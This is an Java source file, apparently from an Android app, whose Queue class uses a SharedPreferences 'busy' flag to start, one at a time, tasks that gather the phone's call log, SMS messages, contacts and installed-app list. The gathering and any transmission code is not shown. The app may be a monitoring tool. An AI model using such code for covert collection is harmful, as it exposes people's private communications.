package com.inet.android.list;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.preference.PreferenceManager;

import com.inet.android.request.AppConstants;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.Logging;

/**
 * Queue class is designed to call control functions of single classes
 * 
 * @author johny homicide
 * 
 */
public class Queue {
	private static final String LOG_TAG = Queue.class.getSimpleName()
			.toString();
	String list;
	Context mContext;
	SharedPreferences sp;
	Editor ed;
	String value;
	String busy;

	public Queue(Context mContext) {
		this.mContext = mContext;

	}

	public static void setList(int list, int value, String busy,
			Context mContext) {
		Logging.doLog(LOG_TAG, "list " + list + " value " + value + " busy = "
				+ busy, "list " + list + " value " + value + " busy = " + busy);
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		Editor ed = sp.edit();
		if (busy != null)
			ed.putString("busy", busy);
		switch (list) {
		case AppConstants.TYPE_LIST_CALL:
			ed.putInt("list_call", value);
			break;
		case AppConstants.TYPE_LIST_SMS:
			ed.putInt("list_sms", value);
			break;
		case AppConstants.TYPE_LIST_CONTACTS:
			ed.putInt("list_contact", value);
			break;
		case AppConstants.TYPE_LIST_APP:
			ed.putInt("list_app", value);
			break;
		default:
			break;
		}
		Logging.doLog(LOG_TAG, "list = " + value, "list = " + value);
		ed.commit();
		getList(mContext);
	}

	public static void getList(Context mContext) {
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		Editor ed = sp.edit();

		Logging.doLog(LOG_TAG, "startGetList() ", "startGetList() ");
		if (sp.getString("busy", "0").equals("0")) {
			Logging.doLog(LOG_TAG,
					"StartGetList busy = " + sp.getString("busy", "0"),
					"busy = " + sp.getString("busy", "0"));
			if (AppSettings.getSetting(AppConstants.TYPE_LIST_CALL, mContext) != 0) {
				Logging.doLog(LOG_TAG, "list_call go", "list_call go");
				ed.putString("busy", "1");
				ed.commit();
				CallList arhCall = new CallList();
				arhCall.execute(mContext);
				return;
			} else if (AppSettings.getSetting(AppConstants.TYPE_LIST_SMS,
					mContext) != 0) {
				Logging.doLog(LOG_TAG, "list_sms go", "list_sms go");
				ed.putString("busy", "1");
				ed.commit();
				MessageList arhSms = new MessageList();
				arhSms.execute(mContext);
				return;
			} else if (AppSettings.getSetting(AppConstants.TYPE_LIST_CONTACTS,
					mContext) != 0) {
				Logging.doLog(LOG_TAG, "list_contact go", "list_contact go");
				ed.putString("busy", "1");
				ed.commit();
				ContactsList getCont = new ContactsList();
				getCont.execute(mContext);
				return;
			} else if (AppSettings.getSetting(AppConstants.TYPE_LIST_APP,
					mContext) != 0) {
				Logging.doLog(LOG_TAG, "list_app go", "list_app go");
				ed.putString("busy", "1");
				ed.commit();
				AppList listApp = new AppList();
				listApp.getListOfInstalledApp(mContext);
				return;
			}
		} else
			Logging.doLog(LOG_TAG, "busy else" + sp.getString("busy", "0"),
					"busy else" + sp.getString("busy", "0"));
	}

	// public void setBusy(String busy) {
	// ed.putString("busy", busy);
	// ed.commit();
	//
	// }

}